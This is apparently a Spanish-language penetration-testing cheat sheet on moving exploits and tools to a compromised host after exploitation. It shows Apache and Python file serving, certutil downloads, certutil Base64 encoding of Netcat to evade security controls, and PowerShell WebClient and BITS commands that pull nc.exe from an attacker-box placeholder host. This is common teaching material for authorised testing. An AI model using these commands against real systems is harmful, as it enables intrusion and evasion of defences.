**Transfiriendo exploit o archivos al target (Post explotation)**

**Transferencias de archivos de Linux**

**Usando Apache**

Copiamos nuestro exploit a /var/www/html en nuestra maquina linux

El siguiente paso es iniciar el servidor web Apache para que podamos descargar el archivo exploit al host comprometido:

>service apache2 start

Ahora podemos acceder al servidor web Apache desde el navegador web (o wget) usando la siguiente URL:

http://[IP Webserver]

Después de servir el último archivo, asegúrese de detener el servidor Apache en el cuadro de ataque con el siguiente comando:

>service apache2 stop

**Usando Python**

Una forma más rápida y segura de servir archivos es con Python SimpleHTTPServer es un módulo de Python que le permite usar un solo comando para crear un servidor web para servir archivos y páginas web.

Para iniciar Python SimpleHTTPServer, ejecute el siguiente comando desde el directorio que contiene los archivos que desea servir :

>python -m SimpleHTTPServer [Optional: port]

En Python 3, el comando tiene el siguiente aspecto:

>python3 -m http.server [Optional: port]

**Transferencias de archivos de Windows**

Las transferencias de archivos en máquinas Windows son un poco más difíciles de lograr desde la línea de comandos, ya que los sistemas Windows no tienen una herramienta nativa como wget.

**CertUtil.exe**

Windows tiene un programa integrado de línea de comandos llamado CertUtil.exe, que se instala como parte de los Servicios de certificados y se puede usar para administrar certificados en Windows.
Certutil también es conocido como un binario Living Off Land (LOL) que es una herramienta de sistema confiable y preinstalada con una funcionalidad inesperada 'extra', como la descarga de archivos. Una característica interesante de certutil es la opción de descargar un certificado remoto desde una URL remota y guardarlo en el sistema de archivos local.

Con el siguiente comando podemos descargar un archivo especificando una URL de descarga y guardarlo en el sistema de archivos local especificando un nombre de archivo como argumento final:

>certutil -urlcache -split -f [URL] [Filename.Extension]

Cargas útiles codificadas en base64
Otra buena característica de CertUtil.exe que puede ayudar a evitar los controles de seguridad es la opción de decodificar archivos codificados en Base64 en el sistema de archivos.

Primero, necesitamos codificar en Base64 el ejecutable de Netcat. El comando para codificar archivos Base64 con CertUtil.exe tiene el siguiente aspecto:
>certutil.exe -encode [inputFileName] [encodedOutputFileName]

El siguiente paso es transferir el archivo de texto al destino y decodificarlo nuevamente en un ejecutable. Podemos hacer esto con los siguientes comandos:
>certutil.exe -urlcache -split -f "http://[Attack box IP]/nc.txt" nc.txt

Y el siguiente comando decodifica el binario codificado en Base64 en un archivo ejecutable:
>certutil.exe -decode nc.txt nc.exe

**Descargas de PowerShell: System.Net.WebClient**

En un script:

>echo $storageDir = $pwd > httpdownload.ps1
>echo $webclient = New-Object System.Net.WebClient >> httpdownload.ps1
>echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1

**Descargas de PowerShell: Start-BitsTransfer**
Otra forma de descargar archivos con PowerShell es mediante el Servicio de transferencia inteligente en segundo plano (BITS).

>powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[IP Attack box]/nc.exe -Destination C:\
